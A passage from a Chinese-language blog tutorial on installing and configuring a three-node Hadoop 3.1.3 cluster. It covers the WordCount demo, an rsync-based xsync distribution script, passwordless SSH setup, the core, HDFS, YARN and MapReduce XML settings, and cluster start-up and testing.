rel="noopener">http://hadoop.apache.org/</a><br>2）Hadoop运行模式包括：本地模式、伪分布式模式以及完全分布式模式。</p><blockquote><p>本地模式：单机运行，只是用来演示一下官方案例。生产环境不用。<br>伪分布式模式：也是单机运行，但是具备Hadoop集群的所有功能，一台服务器模拟一个分布式的环境。个别缺钱的公司用来测试，生产环境不用。<br>完全分布式模式：多台服务器组成分布式环境。生产环境使用。</p></blockquote><h2 id="4-1-本地运行模式（官方WordCount）"><a href="#4-1-本地运行模式（官方WordCount）" class="headerlink" title="4.1 本地运行模式（官方WordCount）"></a>4.1 本地运行模式（官方WordCount）</h2><p><strong>1）创建在hadoop-3.1.3文件下面创建一个wcinput文件夹</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ mkdir wcinput</span><br></pre></td></tr></table></figure><p><strong>2）在wcinput文件下创建一个word.txt文件</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ cd wcinput</span><br></pre></td></tr></table></figure><p><strong>3）编辑word.txt文件</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 wcinput]$ vim word.txt</span><br></pre></td></tr></table></figure><p>在文件中输入如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop yarn</span><br><span class="line">hadoop mapreduce</span><br><span class="line">xusheng</span><br><span class="line">xusheng</span><br></pre></td></tr></table></figure><p>保存退出：:wq<br><strong>4）回到Hadoop目录/opt/module/hadoop-3.1.3</strong><br><strong>5）执行程序</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ hadoop jar share&#x2F;hadoop&#x2F;mapreduce&#x2F;hadoop-mapreduce-examples-3.1.3.jar wordcount wcinput wcoutput</span><br></pre></td></tr></table></figure><p><strong>6）查看结果</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ cat wcoutput&#x2F;part-r-00000</span><br></pre></td></tr></table></figure><p>看到如下结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xusheng2</span><br><span class="line">hadoop  2</span><br><span class="line">mapreduce       1</span><br><span class="line">yarn    1</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/34.png" alt="在这里插入图片描述"></p><h2 id="4-2-完全分布式运行模式（开发重点）"><a href="#4-2-完全分布式运行模式（开发重点）" class="headerlink" title="4.2 完全分布式运行模式（开发重点）"></a>4.2 完全分布式运行模式（开发重点）</h2><p><strong>分析：</strong><br>1）准备3台客户机（关闭防火墙、静态IP、主机名称）<br>2）安装JDK<br>3）配置环境变量<br>4）安装Hadoop<br>5）配置环境变量<br>6）配置集群<br>7）单点启动<br>8）配置ssh<br>9）群起并测试集群</p><h3 id="4-2-1-虚拟机准备"><a href="#4-2-1-虚拟机准备" class="headerlink" title="4.2.1 虚拟机准备"></a>4.2.1 虚拟机准备</h3><p>详见2.1、2.2两节。</p><h3 id="4-2-2-编写集群分发脚本xsync"><a href="#4-2-2-编写集群分发脚本xsync" class="headerlink" title="4.2.2 编写集群分发脚本xsync"></a>4.2.2 编写集群分发脚本xsync</h3><p><strong>1）scp（secure copy）安全拷贝</strong><br>（1）scp 定义<br>scp 可以实现服务器与服务器之间的数据拷贝。（from server1 to server2）<br>（2）基本语法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r  $pdir&#x2F;$fname        $user@$host:$pdir&#x2F;$fname</span><br></pre></td></tr></table></figure><p>命令 递归 要拷贝的文件路径/名称 目的地用户@主机:目的地路径/名称<br>（3）案例实操<br>➢ 前提：在 hadoop102、hadoop103、hadoop104都已经创建好的/opt/module、/opt/software两个目录，并且已经把这两个目录修改为 xusheng:xusheng</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo chown xusheng:xusheng -R &#x2F;opt&#x2F;module</span><br></pre></td></tr></table></figure><p>（a）在 hadoop102 上，将 hadoop102 中/opt/module/jdk1.8.0_212目录拷贝到hadoop103 上。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ scp -r &#x2F;opt&#x2F;module&#x2F;jdk1.8.0_212</span><br><span class="line">xusheng@hadoop103:&#x2F;opt&#x2F;module</span><br></pre></td></tr></table></figure><p>（b）在 hadoop103 上，将 hadoop102 中/opt/module/hadoop-3.1.3目录拷贝到hadoop103 上。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ scp -r</span><br><span class="line">xusheng@hadoop102:&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3 &#x2F;opt&#x2F;module&#x2F;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/35.png" alt="在这里插入图片描述"></p><p>（c）在 hadoop103 上操作，将 hadoop102 中/opt/module目录下所有目录拷贝到hadoop104 上。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 opt]$ scp -r</span><br><span class="line">xusheng@hadoop102:&#x2F;opt&#x2F;module&#x2F;*</span><br><span class="line">xusheng@hadoop104:&#x2F;opt&#x2F;module</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/36.png" alt="在这里插入图片描述"></p><p><strong>2 ）rsync 远程 同步</strong></p><blockquote><p>rsync主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点。<br>rsync 和 scp 区别：用 rsync做文件的复制要比 scp 的速度快，rsync只对差异文件做更新。scp 是把所有文件都复制过去。</p></blockquote><p>（1）基本语法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av $pdir&#x2F;$fname $user@$host:$pdir&#x2F;$fname</span><br></pre></td></tr></table></figure><p>命令 选项参数 要拷贝的文件路径/名称 目的地用户@主机:目的地路径/名称<br>选项参数说明</p><blockquote><p>选项 功能<br>-a 归档拷贝<br>-v 显示复制过程</p></blockquote><p>（2）案例实操<br>（a）删除 hadoop103 中/opt/module/hadoop-3.1.3/wcinput</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 hadoop-3.1.3]$ rm -rf wcinput&#x2F;</span><br></pre></td></tr></table></figure><p>（b）同步 hadoop102 中的/opt/module/hadoop-3.1.3 到 hadoop103</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 module]$ rsync -av hadoop-3.1.3&#x2F;</span><br><span class="line">xusheng@hadoop103:&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;</span><br></pre></td></tr></table></figure><p><strong>3 ）xsync 集群分发 脚本</strong><br>（1）需求：循环复制文件到所有节点的相同目录下<br>（2）需求分析：<br>（a）rsync 命令原始拷贝：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av &#x2F;opt&#x2F;module xusheng@hadoop103:&#x2F;opt&#x2F;</span><br></pre></td></tr></table></figure><p>（b）期望脚本：<br>xsync 要同步的文件名称<br>（c）期望脚本在任何路径都能使用（脚本放在声明了全局环境变量的路径）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ echo $PATH</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;sbin:&#x2F;home&#x2F;xusheng&#x2F;.local&#x2F;bin:&#x2F;home&#x2F;xusheng&#x2F;bin:&#x2F;opt&#x2F;module&#x2F;jdk1.8.0_212&#x2F;bin</span><br></pre></td></tr></table></figure><p>（3）脚本实现<br>（a）在/home/xusheng/bin 目录下创建 xsync 文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 opt]$ cd &#x2F;home&#x2F;xusheng</span><br><span class="line">[xusheng@hadoop102 ~]$ mkdir bin</span><br><span class="line">[xusheng@hadoop102 ~]$ cd bin&#x2F;</span><br><span class="line">[xusheng@hadoop102 bin]$ vim xsync</span><br></pre></td></tr></table></figure><p>在该文件中编写如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#1. 判断参数个数</span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">    echo Not Enough Arguement!</span><br><span class="line">    exit;</span><br><span class="line">fi</span><br><span class="line">#2. 遍历集群所有机器</span><br><span class="line">for host in hadoop102 hadoop103 hadoop104</span><br><span class="line">do</span><br><span class="line">    echo &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; $host &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">    #3. 遍历所有目录，挨个发送</span><br><span class="line">    for file in $@</span><br><span class="line">    do</span><br><span class="line">        #4. 判断文件是否存在</span><br><span class="line">        if [ -e $file ]</span><br><span class="line">            then</span><br><span class="line">                #5. 获取父目录</span><br><span class="line">                pdir&#x3D;$(cd -P $(dirname $file); pwd)</span><br><span class="line">                #6. 获取当前文件的名称</span><br><span class="line">                fname&#x3D;$(basename $file)</span><br><span class="line">                ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">                rsync -av $pdir&#x2F;$fname $host:$pdir</span><br><span class="line">            else</span><br><span class="line">                echo $file does not exists!</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>（b）修改脚本 xsync 具有执行权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 bin]$ chmod +x xsync</span><br></pre></td></tr></table></figure><p>（c）测试脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ xsync &#x2F;home&#x2F;xusheng&#x2F;bin</span><br></pre></td></tr></table></figure><p>（d）将脚本复制到/bin 中，以便全局调用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 bin]$ sudo cp xsync &#x2F;bin&#x2F;</span><br></pre></td></tr></table></figure><p>（e）同步环境变量配置（root 所有者）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo .&#x2F;bin&#x2F;xsync &#x2F;etc&#x2F;profile.d&#x2F;my_env.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/37.png" alt="在这里插入图片描述"><br><img src="/2022/04/11/21104/38.png" alt="在这里插入图片描述"></p><p>注意：如果用了 sudo，那么 xsync 一定要给它的路径补全。让环境变量生效</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 bin]$ source &#x2F;etc&#x2F;profile</span><br><span class="line">[xusheng@hadoop104 opt]$ source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/39.png" alt="在这里插入图片描述"></p><h3 id="4-2-3-SSH无密登录配置"><a href="#4-2-3-SSH无密登录配置" class="headerlink" title="4.2.3 SSH无密登录配置"></a>4.2.3 SSH无密登录配置</h3><p><strong>1 ）置 配置 ssh</strong><br>（1）基本语法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh 另一台电脑的 IP 地址</span><br></pre></td></tr></table></figure><p>（2）ssh 连接时出现 Host key verification failed 的解决方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ ssh hadoop103</span><br></pre></td></tr></table></figure><p>➢ 如果出现如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)?</span><br></pre></td></tr></table></figure><p>➢ 输入 yes，并回车<br>（3）退回到 hadoop102</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ exit</span><br></pre></td></tr></table></figure><p><strong>2 ） 无密钥配置</strong><br>（1）免密登录原理<br><img src="/2022/04/11/21104/40.png" alt="在这里插入图片描述"><br>（2）生成公钥和私钥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 .ssh]$ pwd</span><br><span class="line">&#x2F;home&#x2F;xusheng&#x2F;.ssh</span><br><span class="line">[xusheng@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><strong>然后敲（三个回车）</strong>，就会生成两个文件<br>id_rsa（私钥）、id_rsa.pub（公钥）<br><img src="/2022/04/11/21104/41.png" alt="在这里插入图片描述"><br><img src="/2022/04/11/21104/42.png" alt="在这里插入图片描述"></p><p>（3）将公钥拷贝到要免密登录的目标机器上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[xusheng@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[xusheng@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br></pre></td></tr></table></figure><p><strong>注意：</strong><br>还需要在 hadoop103 上采用 xusheng账号配置一下无密登录hadoop102、hadoop103、hadoop104 服务器上。<br>还需要在 hadoop104 上采用xusheng账号配置一下无密登录hadoop102、hadoop103、hadoop104 服务器上。<br>还需要在 hadoop102 上采用 root 账号，配置一下无密登录到hadoop102、hadoop103、hadoop104；<br><strong>3 ）.ssh 文件夹下 （~/.ssh ）</strong><br><img src="/2022/04/11/21104/43.png" alt="在这里插入图片描述"></p><h3 id="4-2-4-集群配置"><a href="#4-2-4-集群配置" class="headerlink" title="4.2.4 集群配置"></a>4.2.4 集群配置</h3><p><strong>1 ） 集群部署规划</strong><br>注意：<br>➢ NameNode 和 SecondaryNameNode 不要安装在同一台服务器<br>➢ ResourceManager 也很消耗内存，不要和 NameNode、SecondaryNameNode<br>配置在同一台机器上。<br><img src="/2022/04/11/21104/44.png" alt="在这里插入图片描述"><br><strong>2 ）配置文件说明</strong><br>Hadoop<br>配置文件分两类：默认配置文件和自定义配置文件，只有用户想修改某一默认配置值时，才需要修改自定义配置文件，更改相应属性值。<br>（1）默认配置文件：<br><img src="/2022/04/11/21104/45.png" alt="在这里插入图片描述"></p><p>（2）自定义配置文件：<br>core-site.xml 、hdfs-site.xml 、yarn-site.xml 、mapred-site.xml<br>四个配置文件存放在</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$HADOOP_HOME&#x2F;etc&#x2F;hadoop</span><br></pre></td></tr></table></figure><p>这个路径上，用户可以根据项目需求重新进行修改配置。<br><strong>3 ） 配置 集群</strong><br>（1）核心配置文件<br>配置 core-site.xml</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ cd $HADOOP_HOME&#x2F;etc&#x2F;hadoop</span><br><span class="line">[xusheng@hadoop102 hadoop]$ vim core-site.xml</span><br></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type&#x3D;&quot;text&#x2F;xsl&quot; href&#x3D;&quot;configuration.xsl&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;!-- 指定 NameNode 的地址 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;fs.defaultFS&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;hdfs:&#x2F;&#x2F;hadoop102:8020&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">    &lt;!-- 指定 hadoop 数据的存储目录 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;hadoop.tmp.dir&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;data&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">    &lt;!-- 配置 HDFS 网页登录使用的静态用户为 xusheng--&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;hadoop.http.staticuser.user&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;xusheng&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure><p>（2）HDFS 配置文件<br>配置 hdfs-site.xml</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ vim hdfs-site.xml</span><br></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type&#x3D;&quot;text&#x2F;xsl&quot; href&#x3D;&quot;configuration.xsl&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;!-- nn web 端访问地址--&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;dfs.namenode.http-address&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;hadoop102:9870&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">    &lt;!-- 2nn web 端访问地址--&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;dfs.namenode.secondary.http-address&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;hadoop104:9868&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure><p>（3）YARN 配置文件<br>配置 yarn-site.xml</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ vim yarn-site.xml</span><br></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type&#x3D;&quot;text&#x2F;xsl&quot; href&#x3D;&quot;configuration.xsl&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;!-- 指定 MR 走 shuffle --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.nodemanager.aux-services&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;mapreduce_shuffle&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">    &lt;!-- 指定 ResourceManager 的地址--&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.resourcemanager.hostname&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;hadoop103&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">    &lt;!-- 环境变量的继承 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;yarn.nodemanager.env-whitelist&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP</span><br><span class="line">    RED_HOME&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure><p>（4）MapReduce 配置文件<br>配置 mapred-site.xml</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ vim mapred-site.xml</span><br></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type&#x3D;&quot;text&#x2F;xsl&quot; href&#x3D;&quot;configuration.xsl&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.framework.name&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;value&gt;yarn&lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure><p><strong>4 ） 在集群上分发配置好的 Hadoop 配置文件</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ xsync &#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;etc&#x2F;hadoop&#x2F;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/46.png" alt="在这里插入图片描述"></p><p>5 ）去 去 103 和 104 上 查看文件分发情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ cat &#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;etc&#x2F;hadoop&#x2F;core-site.xml</span><br><span class="line">[xusheng@hadoop104 ~]$ cat &#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;etc&#x2F;hadoop&#x2F;core-site.xml</span><br></pre></td></tr></table></figure><h3 id="4-2-5-群起集群"><a href="#4-2-5-群起集群" class="headerlink" title="4.2.5 群起集群"></a>4.2.5 群起集群</h3><p><strong>1 ）置 配置 workers</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ vim &#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;etc&#x2F;hadoop&#x2F;workers</span><br></pre></td></tr></table></figure><p>在该文件中增加如下内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/47.png" alt="在这里插入图片描述"></p><p>注意：该文件中添加的内容结尾不允许有空格，文件中不允许有空行。<br>同步所有节点配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ xsync &#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;etc</span><br></pre></td></tr></table></figure><p><strong>2 ） 启动集群</strong><br>（1） 如果集群是第一次启动，需要在 hadoop102 节点格式化NameNode（注意：格式化 NameNode，会产生新的集群 id，导致 NameNode 和DataNode 的集群 id不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化<br>NameNode 的话，一定要先停止 namenode 和 datanode进程，并且要删除所有机器的 data 和 logs 录，然后再进行格式化。)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure><p>（2）启动 HDFS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ sbin&#x2F;start-dfs.sh</span><br></pre></td></tr></table></figure><p>（3） 在配置了 ResourceManager 的节点 （hadoop103 ）启动 YARN</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 hadoop-3.1.3]$ sbin&#x2F;start-yarn.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/48.png" alt="在这里插入图片描述"></p><p>（4）Web 端查看 HDFS 的 NameNode</p><blockquote><p>（a）浏览器中输入：<a href="http://hadoop102:9870\" target="_blank" rel="noopener">http://hadoop102:9870\</a><br>（b）查看 HDFS 上存储的数据信息</p></blockquote><p>（5）Web 端查看 YARN 的 ResourceManager</p><blockquote><p>（a）浏览器中输入：<a href="http://hadoop103:8088\" target="_blank" rel="noopener">http://hadoop103:8088\</a><br>（b）查看 YARN 上运行的 Job 信息</p></blockquote><p><img src="/2022/04/11/21104/49.png" alt="在这里插入图片描述"></p><p><strong>3 ） 集群基本测试</strong><br>（1）上传文件到集群<br>➢ 上传小文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ hadoop fs -mkdir &#x2F;input</span><br><span class="line">[xusheng@hadoop102 ~]$ hadoop fs -put</span><br><span class="line">$HADOOP_HOME&#x2F;wcinput&#x2F;word.txt &#x2F;input</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/50.png" alt="在这里插入图片描述"></p><p><img src="/2022/04/11/21104/51.png" alt="在这里插入图片描述"></p><p>➢ 上传大文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ hadoop fs -put &#x2F;opt&#x2F;software&#x2F;jdk-8u212-linux-x64.tar.gz &#x2F;</span><br></pre></td></tr></table></figure><p>（2）上传文件后查看文件存放在什么位置<br>➢ 查看 HDFS 文件存储路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 subdir0]$ pwd</span><br><span class="line">&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;data&#x2F;dfs&#x2F;data&#x2F;current&#x2F;BP-1436128598-</span><br><span class="line">192.168.10.102-1610603650062&#x2F;current&#x2F;finalized&#x2F;subdir0&#x2F;subdir0</span><br></pre></td></tr></table></figure><p>➢ 查看 HDFS 在磁盘存储文件内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 subdir0]$ cat blk_1073741825</span><br><span class="line">hadoop yarn</span><br><span class="line">hadoop mapreduce</span><br><span class="line">xusheng</span><br><span class="line">xusheng</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/52.png" alt="在这里插入图片描述"></p><p>（3）拼接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-rw-rw-r--. 1 xusheng xusheng 134217728 5 月 23 16:01 blk_1073741836</span><br><span class="line">-rw-rw-r--. 1 xusheng xusheng 1048583 5 月 23 16:01 blk_1073741836_1012.meta</span><br><span class="line">-rw-rw-r--. 1 xusheng xusheng 63439959 5 月 23 16:01 blk_1073741837</span><br><span class="line">-rw-rw-r--. 1 xusheng xusheng 495635 5 月 23 16:01 blk_1073741837_1013.meta</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 subdir0]$ cat blk_1073741836&gt;&gt;tmp.tar.gz</span><br><span class="line">[xusheng@hadoop102 subdir0]$ cat blk_1073741837&gt;&gt;tmp.tar.gz</span><br><span class="line">[xusheng@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz</span><br></pre></td></tr></table></figure><p>（4）下载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop104 software]$ hadoop fs -get &#x2F;jdk-8u212-linux-x64.tar.gz .&#x2F;</span><br></pre></td></tr></table></figure><p>（5）执行 wordcount 程序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ hadoop jar share&#x2F;hadoop&#x2F;mapreduce&#x2F;hadoop-mapreduce-examples-3.1.3.jar wordcount &#x2F;input &#x2F;output</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/53.png" alt="在这里插入图片描述"></p><h3 id="4-2-6-配置历史服务器"><a href="#4-2-6-配置历史服务器" class="headerlink" title="4.2.6 配置历史服务器"></a>4.2.6 配置历史服务器</h3><p>为了查看程序的历史运行情况，需要配置一下历史服务器。具体配置步骤如下：<br><strong>1 ） 配置 mapred-site.xml</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ vim mapred-site.xml</span><br></pre></td></tr></table></figure><p>在该文件里面增加如下配置。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 历史服务器端地址 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.jobhistory.address&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;hadoop102:10020&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br><span class="line">&lt;!-- 历史服务器 web 端地址 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;hadoop102:19888&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br></pre></td></tr></table></figure><p><strong>2 ） 分发配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ xsync $HADOOP_HOME&#x2F;etc&#x2F;hadoop&#x2F;mapred-site.xml</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/54.png" alt="在这里插入图片描述"></p><p><strong>3 ）在 在 hadoop102 启动历史服务器</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ mapred --daemon start 